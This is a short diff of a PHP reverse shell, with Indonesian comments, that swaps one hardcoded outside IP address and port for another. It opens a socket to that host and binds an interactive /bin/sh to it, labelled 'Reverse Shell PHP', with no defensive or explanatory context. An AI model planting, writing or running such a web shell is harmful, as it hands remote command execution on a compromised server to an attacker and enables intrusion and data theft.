@@ -1,6 +1,8 @@
 <?php
-$ip = '68.183.232.238:9999'; // Ganti dengan IP kamu
-$port = 4455; // Ganti dengan port listener kamu
+// Reverse Shell PHP
+$ip = '216.17.94.185'; // Ganti dengan IP Anda
+$port = 2323; // Ganti dengan port Anda
+
 $sock = fsockopen($ip, $port);
-$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
+exec("/bin/sh -i <&3 >&3 2>&3");
 ?>
